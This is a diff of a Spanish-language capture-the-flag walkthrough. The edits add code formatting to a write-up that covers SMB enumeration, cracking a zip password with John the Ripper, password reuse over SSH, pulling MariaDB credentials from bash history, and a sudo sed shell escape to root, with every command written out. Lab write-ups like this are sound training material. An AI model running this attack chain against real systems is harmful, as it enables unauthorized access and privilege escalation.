@@ -75,11 +75,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 11.59 seconds
 ```
 
-Identificamos los puertos 139 y 445 (SMB) abiertos, así como un servicio SSH corriendo en un puerto no estándar, el 65535.
+Identificamos los puertos `139` y `445` (SMB) abiertos, así como un servicio `SSH` corriendo en un puerto no estándar, el `65535`.
 
 # ENUMERACIÓN SMB
 
-Dado que los puertos de Samba están abiertos, utilizamos enum4linux para intentar listar usuarios y recursos compartidos.
+Dado que los puertos de `Samba` están abiertos, utilizamos `enum4linux` para intentar listar usuarios y recursos compartidos.
 
 ```Bash
 enum4linux -a 10.0.4.52
@@ -115,11 +115,11 @@ S-1-22-1-1000 Unix User\debian (Local User)
 S-1-22-1-1001 Unix User\cowboy (Local User)
 ```
 
-La herramienta nos revela información muy valiosa, existen los usuarios cowboy y debian.
+La herramienta nos revela información muy valiosa, existen los usuarios `cowboy` y `debian`.
 
-El recurso compartido backup parece ser accesible sin credenciales (Mapping: OK).
+El recurso compartido `backup` parece ser accesible sin credenciales (Mapping: OK).
 
-Procedemos a inspeccionar el contenido del recurso backup utilizando smbclient y el usuario guest.
+Procedemos a inspeccionar el contenido del recurso `backup` utilizando `smbclient` y el usuario `guest`.
 
 ```Bash
 smbclient //10.0.4.52/backup -U guest
@@ -140,7 +140,7 @@ getting file \secretito.zip of size 216 as secretito.zip (52.7 KiloBytes/sec) (a
 smb: \> exit
 ```
 
-Encontramos un archivo llamado secretito.zip, el cual descargamos a nuestra máquina local.
+Encontramos un archivo llamado `secretito.zip`, el cual descargamos a nuestra máquina local.
 
 Al intentar descomprimirlo, nos solicita una contraseña que desconocemos.
 
@@ -156,13 +156,13 @@ Archive:  secretito.zip
 ```
 # CRACKING
 
-Para obtener la contraseña del archivo comprimido, primero extraemos su hash utilizando zip2john.
+Para obtener la contraseña del archivo comprimido, primero extraemos su `hash` utilizando `zip2john`.
 
 ```Bash
 zip2john secretito.zip > hash3.txt
 ```
 
-A continuación, utilizamos John the Ripper junto con el diccionario rockyou.txt para intentar crackear el hash.
+A continuación, utilizamos `John the Ripper` junto con el diccionario `rockyou.txt` para intentar crackear el `hash`.
 
 ```Bash
 john --wordlist=/usr/share/wordlists/rockyou.txt hash3.txt
@@ -180,7 +180,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
 
-Obtenemos la contraseña del archivo zip: sebastian.
+Obtenemos la contraseña del archivo zip: `sebastian`.
 
 Ahora sí, descomprimimos el archivo para ver su contenido.
 
@@ -193,11 +193,9 @@ Info:
 elbunkermolagollon123
 ```
 
-El archivo contiene lo que parece ser una contraseña: elbunkermolagollon123.
+El archivo contiene lo que parece ser una contraseña: `elbunkermolagollon123`.
 
-# ACCESO INICIAL
-
-Probamos a reutilizar esta contraseña con el usuario cowboy para conectarnos al servicio SSH en el puerto 65535.
+Probamos a reutilizar esta contraseña con el usuario `cowboy` para conectarnos al servicio `SSH` en el puerto `65535`.
 
 ```Bash
 ssh cowboy@10.0.4.52 -p 65535
@@ -205,7 +203,7 @@ ssh cowboy@10.0.4.52 -p 65535
 
 # MOVIMIENTO LATERAL
 
-Una vez dentro, realizamos una enumeración básica del sistema para buscar vías de escalada o movimiento lateral. Revisando el historial de comandos del usuario cowboy, encontramos información sensible.
+Una vez dentro, realizamos una enumeración básica del sistema para buscar vías de escalada o movimiento lateral. Revisando el `historial de comandos` del usuario `cowboy`, encontramos información sensible.
 
 ```Bash
 cat .bash_history
@@ -220,7 +218,7 @@ mariadb -u cowboy -pelbunkermolagollon123
 su debian
 ```
 
-El historial revela que el usuario se ha conectado a MariaDB utilizando la misma contraseña que usamos para el SSH, y que posteriormente intentó cambiar al usuario debian.
+El historial revela que el usuario se ha conectado a `MariaDB` utilizando la misma contraseña que usamos para el `SSH`, y que posteriormente intentó cambiar al usuario `debian`.
 
 Aprovechamos esta información para conectarnos a la base de datos y enumerar su contenido.
 
@@ -261,7 +259,7 @@ MariaDB [bunker]> SELECT * FROM users;
 1 row in set (0,000 sec)
 ```
 
-Obtenemos un hash MD5 para el usuario debian. Tras crackearlo (podemos usar herramientas online como CrackStation), obtenemos la contraseña en texto plano: password1.
+Obtenemos un `hash MD5` para el usuario `debian`. Tras crackearlo (podemos usar herramientas online como `CrackStation`), obtenemos la contraseña en texto plano: `password1`.
 
 Con esta credencial, migramos al usuario debian.
 
@@ -271,7 +269,7 @@ su debian
 
 # ESCALADA DE PRIVILEGIOS
 
-Comprobamos permisos sudo y SUID para el usuario debian.
+Comprobamos permisos `sudo` y `SUID` para el usuario debian.
 
 ```Bash
 sudo -l
@@ -287,7 +285,7 @@ User debian may run the following commands on sedition:
     (ALL) NOPASSWD: /usr/bin/sed
 ```
 
-Vemos que tenemos permisos para ejecutar sed como root sin contraseña. Consultamos GTFOBins y encontramos que podemos usar sed para invocar una shell.
+Vemos que tenemos permisos para ejecutar `sed` como `root` sin contraseña. Consultamos `GTFOBins` y encontramos que podemos usar sed para invocar una shell.
 
 ```Bash
 sudo /usr/bin/sed -n '1e exec /bin/sh 1>&0' /etc/hosts
@@ -302,7 +300,7 @@ root
 
 Ya somos root!
 
-Por último, obtenemos las flags de usuario y root.
+Por último, obtenemos las `flags` de usuario y root.
 
 ```
 cat /home/debian/flag.txt
